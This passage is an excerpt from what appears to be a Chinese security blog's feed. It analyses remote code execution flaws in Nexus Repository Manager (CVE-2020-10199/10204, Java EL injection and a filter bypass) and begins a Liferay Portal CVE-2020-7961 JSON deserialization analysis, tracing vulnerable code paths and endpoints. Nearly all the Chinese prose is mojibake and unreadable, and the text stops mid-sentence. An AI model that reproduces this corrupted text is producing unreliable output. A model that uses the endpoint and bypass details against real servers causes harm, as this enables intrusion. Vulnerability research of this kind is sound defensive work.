<code>org.sonatype.nexus.repository.rest.api.AbstractGroupRepositoriesApiResource#validateGroupMembers:97</code> ä¸­ <code>createViolation</code> ä¼šè°ƒç”¨æ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">private void validateGroupMembers(T request) &#123;</span><br><span class="line">  String groupFormat = request.getFormat();</span><br><span class="line">  Set&lt;ConstraintViolation&lt;?&gt;&gt; violations = Sets.newHashSet();</span><br><span class="line">  Collection&lt;String&gt; memberNames = request.getGroup().getMemberNames();</span><br><span class="line">  for (String repositoryName : memberNames) &#123;</span><br><span class="line">    Repository repository = repositoryManager.get(repositoryName);</span><br><span class="line">    if (nonNull(repository)) &#123;</span><br><span class="line">      String memberFormat = repository.getFormat().getValue();</span><br><span class="line">      if (!memberFormat.equals(groupFormat)) &#123;</span><br><span class="line">        violations.add(constraintViolationFactory.createViolation(&quot;memberNames&quot;,</span><br><span class="line">            &quot;Member repository format does not match group repository format: &quot; + repositoryName));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      violations.add(constraintViolationFactory.createViolation(&quot;memberNames&quot;,</span><br><span class="line">          &quot;Member repository does not exist: &quot; + repositoryName));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  maybePropagate(violations, log);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>GolangGroupRepositoriesApiResource</code> ç»§æ‰¿ <code>AbstractGroupRepositoriesApiResource</code> ç¬¦åˆï¼Œåœ¨æ‰§è¡Œ <code>createRepository</code> æˆ– <code>updateRepository</code> ä¼šåˆ©ç”¨åˆ° <code>validateGroupMembers</code> ä»è€Œè§¦å‘æ¼æ´ï¼š</p><p><img src="https://img.zhiiyun.com/blog_ae8b11d1407b4c74472e15cdd095c5ce" alt=""></p><p>å…¶ä¸­ <code>@path</code> ä¸ºè¯·æ±‚è·¯å¾„ï¼Œé€šè¿‡å˜é‡æ‹¼æ¥å¯ä»¥å¾—å‡ºå®Œæ•´çš„è·¯å¾„ä¸º <code>beta/repositories/go/group</code> ä¹Ÿå¯ä»¥é€šè¿‡ <code>Java Enterprise</code> å¯ä»¥çœ‹åˆ°è¯·æ±‚è·¯å¾„ä¸º <code>beta/repositories/go/group</code>ã€‚</p><p><img src="https://img.zhiiyun.com/blog_14e7d4c80edbfa56dc692a7f02710736" alt=""></p><p><img src="https://img.zhiiyun.com/blog_a73776cdf58b3258ef65fa557c26148c" alt=""></p><p>é€šè¿‡æŸ¥çœ‹ swagger å¯ä»¥çœ‹åˆ°è¯·æ±‚çš„ Base URL ä¸º <code>/service/rest/</code> ï¼Œæœ€åå¾—å‡ºè¯·æ±‚çš„å®Œæ•´é“¾æ¥ä¸º <code>/service/rest/beta/repositories/go/group</code>ã€‚</p><p><img src="https://img.zhiiyun.com/blog_3978d8601587635f08af326c2f84fe9b" alt=""></p><p>æœ€åå‘èµ·è¯·æ±‚æ‰§è¡Œå‘½ä»¤ï¼š</p><p><img src="https://img.zhiiyun.com/blog_b1303562f2ed7e7c7cf0672a03e40455" alt=""></p><h4 id="memberNameså‚æ•°ä¸ºä»€ä¹ˆ-String-éœ€è¦å˜æˆ-Array"><a href="#memberNameså‚æ•°ä¸ºä»€ä¹ˆ-String-éœ€è¦å˜æˆ-Array" class="headerlink" title="memberNameså‚æ•°ä¸ºä»€ä¹ˆ String éœ€è¦å˜æˆ Array"></a>memberNameså‚æ•°ä¸ºä»€ä¹ˆ String éœ€è¦å˜æˆ Array</h4><p>å¯ä»¥çœ‹åˆ°è¯·æ±‚çš„å‚æ•°ä¸º <code>GolangGroupRepositoryApiRequest</code> ç±»ï¼Œè¯¥ç±»ä¸­è¯·æ±‚çš„å‚æ•° <code>group</code> ç±»å‹ä¸º <code>GroupAttributes</code>ã€‚</p><p><img src="https://img.zhiiyun.com/blog_11815548dfdb344e7c2b370c49af2b21" alt=""></p><p><img src="https://img.zhiiyun.com/blog_5ef6c3e987cbf260e8afdcf663452bbf" alt=""></p><p>å¯ä»¥çœ‹åˆ°åœ¨ <code>GroupAttributes</code> æ„é€ æ–¹æ³•ä¸­éœ€è¦ä¸€ä¸ªå‚æ•°åç§°ä¸º <code>memberNames</code> å±æ€§ï¼Œè¯¥å±æ€§çš„ç±»å‹ä¸º<br><code>Collection&lt;String&gt;</code>ã€‚</p><p><img src="https://img.zhiiyun.com/blog_82fb5aa86f523cf4341113750976c872" alt=""></p><p>é€šè¿‡æŸ¥çœ‹ <code>Collection</code> çš„ç»§æ‰¿é“¾å¯ä»¥çœ‹åˆ°åœ¨æœ‰ <code>List</code>ã€<code>Set</code>ã€<code>Queue</code> ç­‰ç»§æ‰¿ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨è¯·æ±‚çš„å‚æ•°ä¸ºå…¶ä¸­ç»§æ‰¿æŸä¸€ä¸ªç±»å‹å°±å¯ä»¥å®ç°ã€‚</p><p><img src="https://img.zhiiyun.com/blog_1cb6bca530769962ad130dfc25d1f969" alt=""></p><p>å›åˆ°æ­£é¢˜ï¼Œä¸ºä»€ä¹ˆ <code>String</code> ç±»å‹çš„ä¸è¡Œï¼ŒæŸ¥çœ‹ <code>String</code> ç±»ï¼Œæºä»£ç å¯ä»¥çœ‹åˆ° <code>String</code> å¹¶æœªç»§æ‰¿ <code>Collection</code> æ‰€ä»¥æ— æ³•æ­£å¸¸ä½¿ç”¨ã€‚</p><p><img src="https://img.zhiiyun.com/blog_655dffa35cbfd001833092feeea018eb" alt=""></p><h3 id="CVE-2020-10204-1"><a href="#CVE-2020-10204-1" class="headerlink" title="CVE-2020-10204"></a>CVE-2020-10204</h3><p>CVE-2020-10204 ä¸º <a href="https://github.com/Cryin/Paper/blob/master/CVE-2018-16621%20Nexus%20Repository%20Manager3%20%E4%BB%BB%E6%84%8FEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5.md" target="_blank" rel="noopener"><code>CVE-2018-16621</code></a> çš„ç»•è¿‡ï¼Œå®˜æ–¹åœ¨ä¿®å¤çš„æ¼æ´é‡‡ç”¨çš„æ–¹æ¡ˆæ˜¯æ–°å¢ <code>org.sonatype.nexus.common.template.EscapeHelper.stripJavaEl:81</code> å¯¹ç”¨æˆ·è¾“å…¥roleså‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œæ­£åˆ™åŒ¹é…çš„ç»“æœæ˜¯å°†â€˜${â€™æ›¿æ¢ä¸ºâ€˜{ â€™ï¼Œä»è€Œé˜²æ­¢ELè¡¨è¾¾å¼æ³¨å…¥ï¼Œä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Strip java el start token from a string</span><br><span class="line"> * @since 3.14</span><br><span class="line"> */</span><br><span class="line">public String stripJavaEl(final String value) &#123;</span><br><span class="line">  if (value != null) &#123;</span><br><span class="line">    return value.replaceAll(&quot;\\$+\\&#123;&quot;, &quot;&#123;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ¼æ´è§¦å‘ä¸»è¦æ˜¯ç”±äº <code>org.sonatype.nexus.security.privilege.PrivilegesExistValidator</code> å’Œ <code>org.sonatype.nexus.security.role.RolesExistValidator</code> ç±»ä¸­ï¼Œä¼šå°†æ²¡æœ‰æ‰¾åˆ°çš„ privilege æˆ– role æ”¾å…¥é”™è¯¯æ¨¡æ¿ä¸­ï¼Œè€Œåœ¨é”™è¯¯æ¨¡æ¿åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæå–å…¶ä¸­çš„<code>ELè¡¨è¾¾å¼</code>å¹¶æ‰§è¡Œã€‚</p><p><img src="https://img.zhiiyun.com/blog_3992887f554cd4552e3bda7765bb7089" alt=""></p><p><img src="https://img.zhiiyun.com/blog_261b858ce8a2538ca430c14faf463a93" alt=""></p><p>æœ€åå‘èµ·è¯·æ±‚æ‰§è¡Œå‘½ä»¤ï¼š</p><p><img src="https://img.zhiiyun.com/blog_6fb65e49b221f7ac73d4588cbe83616e" alt=""></p><h3 id="ELè¡¨è¾¾å¼æ‰§è¡Œæµç¨‹"><a href="#ELè¡¨è¾¾å¼æ‰§è¡Œæµç¨‹" class="headerlink" title="ELè¡¨è¾¾å¼æ‰§è¡Œæµç¨‹"></a>ELè¡¨è¾¾å¼æ‰§è¡Œæµç¨‹</h3><p>è¿›å…¥ <code>ELè¡¨è¾¾å¼</code> æµç¨‹ä¹‹åä¼šé€šè¿‡<code>org.hibernate.validator.internal.engine.constraintvalidation.ConstraintTree#validateConstraints</code>  è¿›è¡Œæ ¡éªŒè¡¨è¾¾å¼ï¼Œç„¶åé€šè¿‡ <code>addConstraintFailure</code>  è¿›è¡Œæ·»åŠ  <code>validationContext</code>ã€‚</p><p><img src="https://img.zhiiyun.com/blog_6a2a9f8d7f3015235ed3fc1457b65379" alt=""></p><p>è·Ÿè¿› <code>addConstraintFailure</code> ä¹‹åå¯ä»¥çœ‹åˆ° <code>messageTemplate</code> ä¸ºæˆ‘ä»¬æäº¤çš„ <code>ELè¡¨è¾¾å¼</code> ä¿¡æ¯ï¼Œç„¶åé€šè¿‡ <code>this.interpolate</code> è¿›è¡Œæ‰§è¡Œè¯¥è¡¨è¾¾å¼ã€‚</p><p><img src="https://img.zhiiyun.com/blog_c50065e1c4d2729369ada30acaeb5cc1" alt=""></p><p>è·Ÿè¿› <code>this.interpolate</code> å¯ä»¥çœ‹åˆ°é€šè¿‡ <code>this.validatorScopedContext.getMessageInterpolator().interpolate(messageTemplate, context);</code> è¿›è¡Œæ‰§è¡Œï¼Œå…¶ä¸­ <code>messageTemplate</code> å‚æ•°ä¸ºæˆ‘ä»¬æäº¤çš„ <code>ELè¡¨è¾¾å¼</code> ã€‚</p><p><img src="https://img.zhiiyun.com/blog_0bd7963fd5927472026f5cb8964b7b76" alt=""></p><p>è·Ÿè¿› <code>org.hibernate.validator.messageinterpolation.AbstractMessageInterpolator#interpolate</code> ä¹‹åï¼Œå°†æäº¤çš„ <code>ELè¡¨è¾¾å¼</code> ä½œä¸ºå‚æ•°äº¤ç”± <code>this.interpolateMessage(message, context, this.defaultLocale);</code> å¤„ç†ã€‚</p><p><img src="https://img.zhiiyun.com/blog_13a3fd4a69d35ce0de2a137f00fc463e" alt=""></p><p>ç»§ç»­è·Ÿè¿› <code>org.hibernate.validator.messageinterpolation.AbstractMessageInterpolator#interpolateMessage</code> ç„¶åé€šè¿‡ <code>this.interpolateExpression</code> è¿›è¡Œé’ˆå¯¹è¡¨è¾¾å¼è¿›è¡Œå¤„ç†ï¼Œç„¶åå°†å¤„ç†ç»“æœèµ‹å€¼ç»™ <code>resolvedMessage</code>ï¼Œå¹¶ä¸”ä½œä¸ºå‚æ•°å†æ¬¡å¤„ç†è¡¨è¾¾å¼ã€‚</p><p><img src="https://img.zhiiyun.com/blog_11491d445bae76de45fb80353c3e3ade" alt=""></p><p><img src="https://img.zhiiyun.com/blog_0813c1cba82cca610da84619215411b5" alt=""></p><p>æ­¤æ—¶æ‰§è¡Œçš„ä»£ç ä¸º <code>this.interpolateExpression(new TokenIterator(this.getParameterTokens(resolvedMessage, this.tokenizedELMessages, InterpolationTermType.EL)), context, locale);</code> è·Ÿè¿›ä»£ç å¯ä»¥çœ‹åˆ° <code>isEL=True</code>ï¼Œç„¶åé€šè¿‡ <code>this.interpolate</code> å¤„ç†ã€‚</p><p><img src="https://img.zhiiyun.com/blog_867b6d47394d000e4edcccaf9fb71b8a" alt=""></p><p>è·Ÿè¿› <code>org.hibernate.validator.messageinterpolation.ResourceBundleMessageInterpolator#interpolate:83</code> å¯ä»¥çœ‹åˆ°å·²ç»å°†æˆ‘ä»¬æäº¤çš„ <code>ELè¡¨è¾¾å¼</code> å®ä¾‹åŒ–ä¸º EL ç±»å‹å¯¹è±¡ã€‚</p><p><img src="https://img.zhiiyun.com/blog_1337f2653c8c9b3810aa8445cab34aa4" alt=""></p><p>æœ€åé€šè¿‡ <code>org.hibernate.validator.internal.engine.messageinterpolation.ElTermResolver#interpolate</code> æ–¹æ³•ä¸­çš„ <code>resolvedExpression = (String)valueExpression.getValue(elContext);</code> è¿›è¡Œæ‰§è¡Œè¡¨è¾¾å¼ï¼Œç„¶åå°†æ‰§è¡Œç»“æœè½¬æ¢ä¸º <code>String</code> ç±»å‹ç»“æœå†…å®¹è¿›è¡Œå“åº”ã€‚</p><p><img src="https://img.zhiiyun.com/blog_696be39fc70fe24cbcc9238112f0f962" alt=""></p><p>ä»¥ä¸‹ä¸ºæ•´ä¸ªçš„è°ƒç”¨é“¾æ¡ï¼š</p><p><img src="https://img.zhiiyun.com/blog_74d83350cfdb5fe398848351c2bedcaa" alt=""></p><h2 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h2><p>å‡çº§è‡³æœ€æ–°ç‰ˆæœ¬æˆ– Nexus Repository Manager 3.x OSS / Pro &gt; 3.21.1</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li style="list-style: none"><input type="checkbox" checked> <a href="https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype" target="_blank" rel="noopener">GHSL-2020-011: Remote Code Execution - JavaEL Injection (low privileged accounts) in Nexus Repository Manager</a></li><li><a href="https://hu3sky.github.io/2020/04/08/CVE-2020-10204_CVE-2020-10199:%20Nexus%20Repository%20Manager3%20%E5%88%86%E6%9E%90&amp;%E4%BB%A5%E5%8F%8A%E4%B8%89%E4%B8%AA%E7%B1%BB%E7%9A%84%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/#%E5%9B%9E%E6%98%BE" target="_blank" rel="noopener">CVE-2020-10204/CVE-2020-10199 Nexus Repository Manager3 åˆ†æ&amp;ä»¥åŠä¸‰ä¸ªç±»çš„å›æ˜¾æ„é€ </a></li><li><a href="https://www.cnblogs.com/magic-zero/p/12641068.html" target="_blank" rel="noopener">Nexus Repository Manager(CVE-2020-10199/10204)æ¼æ´åˆ†æåŠå›æ˜¾åˆ©ç”¨æ–¹æ³•çš„ç®€å•è®¨è®º</a></li><li><a href="https://github.com/threedr3am/learnjavabug/tree/master/nexus/CVE-2020-10199" target="_blank" rel="noopener">CVE-2020-10199</a></li><li><a href="https://github.com/threedr3am/learnjavabug/tree/master/nexus/CVE-2020-10204" target="_blank" rel="noopener">CVE-2020-10204</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;authorï¼šr4v3zn@ç™½å¸½æ±‡å®‰å…¨ç ”ç©¶é™¢&lt;/p&gt;
&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;3 æœˆ 31 æ—¥ Nexus Repository Manager å®˜æ–¹å‘å¸ƒäº† 
      
    
    </summary>
    
      <category term="æ¼æ´ç ”ç©¶" scheme="http://www.r4v3zn.com/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="cve" scheme="http://www.r4v3zn.com/tags/cve/"/>
    
      <category term="Nexus Repository Manager" scheme="http://www.r4v3zn.com/tags/Nexus-Repository-Manager/"/>
    
  </entry>
  
  <entry>
    <title>Liferay Portal CVE-2020-7961 åˆ†æ</title>
    <link href="http://www.r4v3zn.com/posts/a86ea905/"/>
    <id>http://www.r4v3zn.com/posts/a86ea905/</id>
    <published>2020-03-27T08:25:19.000Z</published>
    <updated>2020-11-11T08:06:56.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>è¿‘æ—¥æœ‰ Code White å®‰å…¨å›¢é˜Ÿå‘ç°å…³äº Liferay Portal å¤šä¸ªæ¯”è¾ƒä¸¥é‡çš„ JSON fan ååºåˆ—åŒ–æ¼æ´ï¼Œå½±å“ Liferay Portal 6.1ã€6.2ã€7.0ã€7.1 ä»¥åŠ 7.2 ç‰ˆæœ¬ï¼Œè¿™äº›æ¼æ´å¯ä»¥é€šè¿‡ Json web è¿›è¡Œæœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œã€‚å›ºå®šç‰ˆæœ¬ä¸º 6.2 GA6ã€7.0 GA7ã€7.1 GA4 å’Œ 7.2 GA2ã€‚<br>å¯¹åº”çš„æ¼æ´åˆ†åˆ«æ˜¯ï¼š</p><ul><li><a href="https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/113765197" target="_blank" rel="noopener">CST-7111: é€šè¿‡JSONååºåˆ—åŒ–å®ç°RCE (LPS-88051/LPE-16598)</a><br>åœ¨Liferay Portal 6.1å’Œ6.2ä¸­ï¼ŒFlexjson åº“ç”¨äºåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ•°æ®ã€‚å®ƒæ”¯æŒå¯¹è±¡ç»‘å®šï¼Œå¯¹ä»»ä½•å¸¦æœ‰æ— å‚æ•°æ„é€ å‡½æ•°çš„ç±»å°†ä½¿ç”¨è¢«åˆå§‹åŒ–å¯¹è±¡çš„ <code>setter</code> æ–¹æ³•ã€‚ç±»çš„è§„èŒƒæ˜¯é€šè¿‡classå¯¹è±¡é”®ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;class&quot;:&quot;fully.qualified.ClassName&quot;, ... &#125;</span><br></pre></td></tr></table></figure></li></ul></blockquote><p>è¯¥æ¼æ´äº 2018 å¹´ 12 æœˆè¢«æŠ¥å‘Šï¼Œå·²åœ¨ä¼ä¸šç‰ˆä¸­è¢«ä¿®å¤ï¼ŒåŒ…æ‹¬ 6.1 EE GA3 fixpack 71 å’Œ 6.2 EE GA2 fixpack 1692 å’Œ 6.2 GA6ã€‚</p><ul><li><a href="https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/117954271" target="_blank" rel="noopener">CST-7205: é€šè¿‡JSONWSå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ (LPS-97029/CVE-2020-7961)</a><br><code>JSONWebServiceActionParametersMap</code> Liferay  Portal çš„å…è®¸ä»»æ„ç±»å’Œä»»æ„ <code>setter</code> æ–¹æ³•è°ƒç”¨çš„å®ä¾‹ã€‚</li></ul><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ“ä½œç³»ç»Ÿï¼š Mac OS</li><li>JDKï¼š1.8.0_171</li><li>è°ƒè¯•å·¥å…·ï¼šIdea</li><li>éƒ¨ç½²ï¼šTomcat-9.0.17</li><li>Liferay  Portalï¼š<a href="https://jaist.dl.sourceforge.net/project/lportal/Liferay Portal/7.2.0 GA1/liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.tar.gz" target="_blank" rel="noopener">liferay-ce-portal-tomcat-7.2.0-ga1</a></li></ul><p>é…ç½® Tomcat è°ƒè¯•ç«¯å£ï¼Œä¿®æ”¹ <code>tomcat/bin/setenv.sh</code> (windows ä¸º setenv.bat) æ–‡ä»¶åŠ å…¥<code>export JPDA_ADDRESS=0.0.0.0:5555</code> (windows ä¸º <code>set JPDA_ADDRESS=0.0.0.0:5555</code>)ï¼Œå…¶ä¸­<code>5555</code> ä¸ºè¿œç¨‹è°ƒè¯•ç«¯å£ï¼Œ<code>0.0.0.0</code> è¡¨ç¤ºå¯è¿æ¥è°ƒè¯•ç«¯å£çš„ IP åœ°å€ã€‚</p><p>å°†æ•´ä¸ªé¡¹ç›®ä½œä½œä¸ºè°ƒè¯•è¿è¡Œç›®å½•ï¼Œå°† <code>tomcat-9.0.17/webapps/ROOT/WEB-INF/lib</code> ç›®å½•æ·»åŠ  <code>Libraries</code> ï¼š</p><p><img src="https://img.zhiiyun.com/blog_372ec8575694ab12692e09c93b71c2d7" alt=""></p><p>é…ç½® <code>Remote</code> æ–¹å¼è¿›è¡Œè¿œç¨‹è°ƒè¯•ï¼Œip è®¾ç½®ä¸ºå¼€å¯ tomcat è°ƒè¯•æœåŠ¡çš„ IPï¼Œç«¯å£ä¸º <code>5555</code>ï¼š</p><p><img src="https://img.zhiiyun.com/blog_cbc0d6d6f3d3282878cdb4d11b603827" alt=""></p><p><strong>æ³¨ï¼šTocmat è¿è¡Œå‘½ä»¤ä¸º <code>./catalina.sh jpda start</code> ä½¿ç”¨è°ƒè¯•æ¨¡å¼è¿è¡Œã€‚</strong></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>Liferay Portal æä¾›äº†ä¸€ä¸ªå…¨é¢çš„ JSON Web æœåŠ¡ API ï¼Œå¹¶æä¾›äº†ä¸‰ç§ä¸åŒçš„è°ƒç”¨WebæœåŠ¡æ–¹æ³•çš„ç¤ºä¾‹ï¼š</p><ul><li><p>é€šè¿‡é€šç”¨URL <code>/api/jsonws/invoke</code>ï¼Œå…¶ä¸­æœåŠ¡æ–¹æ³•åŠå…¶å‚æ•°é€šè¿‡POSTä½œä¼ è¾“ï¼Œä¸€ä¸ªJSONå¯¹è±¡æˆ–åŸºäºè¡¨å•çš„å‚æ•°ã€‚</p></li><li><p>é€šè¿‡æœåŠ¡æ–¹æ³•ç‰¹å®šçš„ URL ï¼Œä¾‹å¦‚ <code>/api/jsonws/service-class-name/service-method-name</code> ï¼Œå…¶ä¸­å‚æ•°ä¼ é€’æ˜¯é€šè¿‡åŸºäºè¡¨å•çš„ <code>POST</code> æ•°æ®åŒ…ã€‚</p></li><li><p>é€šè¿‡æœåŠ¡æ–¹æ³•ç‰¹å®šçš„URLï¼Œä¾‹å¦‚ <code>/api/jsonws/service-class-name/service-method-name</code>ï¼Œå…¶ä¸­å‚æ•°ä¹Ÿæ˜¯é€šè¿‡URLçš„å½¢å¼ä¼ é€’ï¼Œä¾‹å¦‚ <code>/api/jsonws/service-class-name/service-method-name/arg1/val1/arg2/val2/â€¦</code> ã€‚</p></li></ul><p>åœ¨ Liferay Portal  ä¸»è¦åœ¨ <code>/tomcat-9.0.17/webapps/ROOT/WEB-INF/lib/portal-impl.jar</code>æ–‡ä»¶ä¸­<code>com.liferay.portal.jsonwebservice.JSONWebServiceServiceAction#getJSON:43</code>  è¿›è¡Œå¤„ç† JSON è¯·æ±‚ç„¶åäº¤ç”±<code>com.liferay.portal.jsonwebservice.JSONWebServiceServiceAction#getJSONWebServiceAction:115</code> æ¥è¿›è¡Œå¤„ç† Json APIã€‚</p><p><img src="https://img.zhiiyun.com/blog_09a7e0ebb5901e67c6e3f69a4b2014f5" alt=""></p><p><img src="https://img.zhiiyun.com/blog_4e147b1af4ed367b9c16baefc7c35f90" alt=""></p><p>ç„¶åä¼šé€šè¿‡ <code>com.liferay.portal.jsonwebservice.JSONWebServiceActionsManagerImpl#getJSONWebServiceAction:74</code> è¿›è¡Œå¯¹è¯·æ±‚å¯¹å‚æ•°è¿›è¡Œæ¥è¿›è¡Œéå†å¤„ç†ã€‚</p><p><img src="https://img.zhiiyun.com/blog_ac52c7895038da0b46e4890b4b0cfece" alt=""><br><code>com.liferay.portal.jsonwebservice.JSONWebServiceActionParameters#collectAll:50</code> ä¸­ <code>this._collectFromRequestParameters(httpServletRequest);</code> æ¥è¿›è¡Œå¤„ç†è¯·æ±‚å‚æ•°ã€‚<br><img src="https://img.zhiiyun.com/blog_4b10ff84ed43512af11ac3c7685eae99" alt=""></p><p><code>com.liferay.portal.jsonwebservice.JSONWebServiceActionParameters._collectFromRequestParameters;170</code> é¦–å…ˆä¼šå°†å‚æ•°è½¬æ¢ä¸º <code>Set</code> ç±»å‹ï¼Œç„¶åè¿›è¡Œè¿­ä»£å¾ªç¯ï¼Œæœ€åé€šè¿‡ <code>this._jsonWebServiceActionParameters.put(parameterName, value);</code>ã€‚</p><p><img src="https://img.zhiiyun.com/blog_4b259f423c647936de93b3761ef3ba6c" alt=""></p><p><img src="https://img.zhiiyun.com/blog_c9fde0bac4bced9b91bb8c534fd736f3" alt=""></p><p><img src="https://img.zhiiyun.com/blog_68560b5182d04114e3a8a45afeda19d8" alt=""></p><p>è·Ÿè¸ªè¿›å…¥ä¼šè·³å…¥ <code>com.liferay.portal.jsonwebservice.JSONWebServiceActionParametersMap#put:48</code> ä¸­å¹¶ä¸”å°†å‚æ•°åç§°ä»¥åŠå€¼è¿›è¡Œä¼ å…¥ï¼Œå¹¶ä¸”åˆ¤å®šå‚æ•°åæ˜¯å¦åŒ…å« <code>:</code>  ( char 58 è¡¨ç¤ºä¸º <code>:</code>) ï¼Œç„¶åé€šè¿‡ <code>this._parameterTypes.put(key, typeName);</code> å°† <code>:</code> ä¹‹å‰çš„å†…å®¹ä½œä¸º <code>key</code> ä»¥åŠ <code>:</code> ä¹‹åçš„å†…å®¹ä½œä¸ºç±»å‹æ·»åŠ è‡³ <code>this._parameterTypes</code> å˜é‡ä¸­ã€‚</p><p><img src="https://img.zhiiyun.com/blog_cb070b178221c5a1d35377604e94408a" alt=""></p><p><img src="https://img.zhiiyun.com/blog_3a47787b4f7d8849c3b3d43b8195e8a6" alt=""></p><p><img src="https://img.zhiiyun.com/blog_75a2fffaba0c3320bb221af161811db6" alt=""></p><p><code>com.liferay.portal.jsonwebservice.JSONWebServiceServiceAction#getJSONWebServiceAction</code> æ‰§è¡Œå®Œæ¯•ä¼šè·³å› <code>com.liferay.portal.jsonwebservice.JSONWebServiceServiceAction#getJSON</code> å¹¶ä¸”æ‰§è¡Œ <code>jsonWebServiceAction.invoke()</code>ã€‚</p><p><img src="https://img.zhiiyun.com/blog_25be29acacfdf8dd1da980c050376195" alt=""></p><p>è·Ÿè¿› <code>com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#invoke:54</code> ç„¶åä¼šæ‰§è¡Œ <code>this._invokeActionMethod();</code>ã€‚</p><p><img src="https://img.zhiiyun.com/blog_649e258a36579357e481496074ae9679" alt=""></p><p>è¿›å…¥ <code>com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#_invokeActionMethod</code> ä¹‹åï¼Œå°†<code>actionClass</code> ä½œä¸ºå‚æ•°è°ƒç”¨  <code>thiis._prepareParameters(actionClass);:316</code> ã€‚</p><p><img src="https://img.zhiiyun.com/blog_488c4b6c02e01e5fde526d27d6342321" alt=""></p><p>è·Ÿè¿› <code>com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#_prepareParameters</code> ä¹‹åä¼šé€šè¿‡ <code>this._jsonWebServiceActionConfig.getMethodParameters()</code> è·å–è¯·æ±‚æ–¹æ³•å‚æ•°ï¼Œç„¶åè¿›è¡Œå¾ªç¯æ ¹æ®æŒ‡å®šç±»è½½å…¥çš„å‚æ•°åä¸è¯·æ±‚åŒ…ä¸­çš„å‚æ•°åè¿›è¡Œèµ‹å€¼ï¼Œç„¶åæ ¹æ®è½½å…¥ç±»ä¸­å‚æ•°çš„ç±»å‹ã€‚å¦‚æœé€šè¿‡ <code>this._jsonWebServiceActionParameters.getParameter(parameterName);</code> æå–åˆ°å†…å®¹ä¿¡æ¯ä¼šé€šè¿‡ <code>this._jsonWebServiceActionParameters.getParameterTypeName(parameterName);</code> è¿›è¡Œè·å–è¯·æ±‚å‚æ•°ç±»å‹ï¼Œä¹Ÿå°±æ˜¯ <code>:</code> ä¹‹åçš„å†…å®¹ï¼Œå¹¶ä¸”é€šè¿‡ ClassLoader è·å–è¯¥ç±»çš„ classã€‚</p><p><img src="https://img.zhiiyun.com/blog_af63a6b0ffe5a7016f38f607b7b3a9d2" alt=""></p><p>è·å–åˆ°è¯¥ç±»çš„ Class ä¹‹åï¼Œä¼šé€šè¿‡ <code>parameterValue = this._convertValueToParameterValue(value, parameterType, methodParameters[i].getGenericTypes());</code> å°†å†…å®¹è½¬æ¢ä¸ºå‚æ•°ç±»å‹å¯¹è±¡ã€‚</p><p><img src="https://img.zhiiyun.com/blog_4ca4159b2e6a9e56371cf2b6fc6926e7" alt=""></p><p>è·Ÿè¸ªè¿›å…¥ <code>com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#_convertValueToParameterValue</code> ä¹‹åä¼šè·³å…¥ <code>com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#_convertType</code> 